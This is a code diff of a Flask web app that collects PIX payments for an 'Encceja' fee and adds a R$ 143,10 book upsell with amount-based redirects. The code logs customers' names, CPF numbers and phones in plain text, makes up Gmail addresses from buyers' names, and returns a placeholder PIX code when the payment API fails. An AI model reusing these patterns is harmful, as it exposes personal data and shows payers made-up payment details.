@@ -1227,6 +1227,27 @@ def verificar_pagamento():
             
             # Adicionar os IDs dos Pixels ao resultado para processamento no frontend
             status_result['facebook_pixel_id'] = ['1418766538994503', '1345433039826605', '1390026985502891']
+            
+            # Verificar se é um pagamento de R$ 143,10 para redirecionamento para /livro
+            try:
+                # Verificar se temos o valor na resposta da API ou nos dados do pagamento
+                payment_amount = status_result.get('amount', 0)
+                
+                # Para For4Payments, o valor pode estar em centavos
+                if isinstance(payment_amount, int) and payment_amount > 1000:
+                    payment_amount = payment_amount / 100
+                
+                app.logger.info(f"[PROD] Valor do pagamento: {payment_amount}")
+                
+                # Verificar se é o valor específico de R$ 143,10
+                if abs(float(payment_amount) - 143.10) < 0.01:
+                    app.logger.info(f"[PROD] Pagamento de R$ 143,10 detectado. Configurando redirecionamento para /livro")
+                    status_result['redirect_to'] = '/livro'
+                else:
+                    app.logger.info(f"[PROD] Pagamento com outro valor: {payment_amount}. Redirecionamento padrão para /obrigado")
+            except Exception as e:
+                app.logger.error(f"[PROD] Erro ao verificar valor do pagamento: {str(e)}")
+                # Continuar com o fluxo normal se houver erro na verificação do valor
         
         return jsonify(status_result)
     
@@ -1274,6 +1295,20 @@ def check_for4payments_status():
             nome = request.args.get('nome', '')
             cpf = request.args.get('cpf', '')
             phone = request.args.get('phone', '')
+            
+            # Verificar se o pagamento é do valor específico de R$ 143,10
+            try:
+                # Tentar obter o valor do pagamento das informações da transação
+                payment_amount = status_result.get('amount')
+                app.logger.info(f"[PROD] Valor do pagamento: {payment_amount}")
+                
+                # Se o valor for exatamente 143.10, preparar redirecionamento para a página do livro
+                if payment_amount == 143.10:
+                    app.logger.info(f"[PROD] Pagamento de R$ 143,10 confirmado. Redirecionando para /livro")
+                    # Este campo extra será usado pelo JavaScript para redirecionar
+                    status_result['redirect_to'] = '/livro'
+            except Exception as e:
+                app.logger.error(f"Erro ao verificar valor do pagamento: {str(e)}")
             
             app.logger.info(f"[PROD] Pagamento {transaction_id} aprovado. Enviando SMS com link de agradecimento.")
             
@@ -1455,6 +1490,25 @@ def send_test_sms():
         session['test_success'] = False
         return redirect(url_for('sms_config'))
 
+@app.route('/livro')
+def livro():
+    """Página de livro após confirmação do pagamento de R$ 143,10"""
+    try:
+        # Get customer data from query parameters if available
+        customer = {
+            'name': request.args.get('nome', ''),
+            'cpf': request.args.get('cpf', ''),
+            'phone': request.args.get('phone', '')
+        }
+        
+        app.logger.info(f"[PROD] Renderizando página do livro com dados: {customer}")
+        meta_pixel_id = os.environ.get('META_PIXEL_ID')
+        
+        return render_template('livro.html', customer=customer, meta_pixel_id=meta_pixel_id)
+    except Exception as e:
+        app.logger.error(f"[PROD] Erro na página do livro: {str(e)}")
+        return jsonify({'error': 'Erro interno do servidor'}), 500
+
 @app.route('/encceja')
 def encceja():
     """Página do Encceja 2025"""
@@ -1490,6 +1544,56 @@ def encceja_info():
     """Página com informações detalhadas sobre o Encceja"""
     return render_template('encceja_info.html')
 
+@app.route('/comprar-livro', methods=['GET', 'POST'])
+def comprar_livro():
+    """Página para iniciar o pagamento do livro de R$ 143,10"""
+    if request.method == 'POST':
+        # Obter dados do usuário
+        data = request.get_json()
+        nome = data.get('nome')
+        cpf = data.get('cpf')
+        telefone = data.get('telefone')
+        
+        if not nome or not cpf:
+            return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
+        
+        try:
+            # Criar instância da API de pagamento
+            payment_api = get_payment_gateway()
+            
+            # Criar pagamento do livro (R$ 143,10)
+            app.logger.info(f"[PROD] Criando pagamento de livro digital para: {nome} ({cpf})")
+            payment_result = payment_api.create_pix_payment({
+                'name': nome,
+                'cpf': cpf,
+                'phone': telefone,
+                'amount': 143.10,  # Valor específico do livro digital
+                'email': f"{nome.lower().replace(' ', '')}@gmail.com"
+            })
+            
+            app.logger.info(f"[PROD] Pagamento de livro criado: {payment_result.get('id')}")
+            
+            # Retornar os dados do pagamento
+            return jsonify(payment_result)
+        except Exception as e:
+            app.logger.error(f"Erro ao criar pagamento do livro: {str(e)}")
+            
+            # Gerar um código PIX de exemplo para caso de falha na API
+            demo_payment_data = {
+                'id': 'demo-123456',
+                'pixCode': '00020126870014br.gov.bcb.pix2565pix.example.com/qr/demo/12345',
+                'status': 'PENDING'
+            }
+            
+            # Retornar resposta com mensagem de erro, mas com dados de exemplo
+            return jsonify({
+                'warning': f"API de pagamento temporariamente indisponível: {str(e)}",
+                **demo_payment_data
+            }), 200
+    
+    # Para requisições GET, renderizar a página de pagamento
+    return render_template('pagamento.html', is_book_payment=True)
+
 @app.route('/pagamento', methods=['GET', 'POST'])
 def pagamento_encceja():
     """Página de pagamento da taxa do Encceja"""
@@ -1500,15 +1604,29 @@ def pagamento_encceja():
         cpf = data.get('cpf')
         telefone = data.get('telefone')
         has_discount = data.get('has_discount', False)
+        is_book_payment = data.get('is_book_payment', False)  # Novo campo para pagamento do livro
         
         if not nome or not cpf:
             return jsonify({'error': 'Dados obrigatórios não fornecidos'}), 400
         
         try:
-            if has_discount:
+            # Criar instância da API de pagamento
+            payment_api = get_payment_gateway()
+            
+            if is_book_payment:
+                # Pagamento do livro digital (R$ 143,10)
+                app.logger.info(f"[PROD] Criando pagamento de livro digital para: {nome} ({cpf})")
+                payment_result = payment_api.create_pix_payment({
+                    'name': nome,
+                    'cpf': cpf,
+                    'phone': telefone,
+                    'amount': 143.10,  # Valor específico do livro digital
+                    'email': f"{nome.lower().replace(' ', '')}@gmail.com"
+                })
+                app.logger.info(f"[PROD] Pagamento de livro criado: {payment_result.get('id')}")
+            elif has_discount:
                 # Usar API de pagamento através do gateway configurado
                 app.logger.info(f"[PROD] Criando pagamento com desconto para: {nome} ({cpf})")
-                payment_api = get_payment_gateway()
                 payment_result = payment_api.create_pix_payment({
                     'name': nome,
                     'cpf': cpf,
@@ -1519,7 +1637,6 @@ def pagamento_encceja():
             else:
                 # Usar API de pagamento através do gateway configurado
                 app.logger.info(f"[PROD] Criando pagamento regular para: {nome} ({cpf})")
-                payment_api = get_payment_gateway()
                 payment_result = payment_api.create_pix_payment({
                     'name': nome,
                     'cpf': cpf,
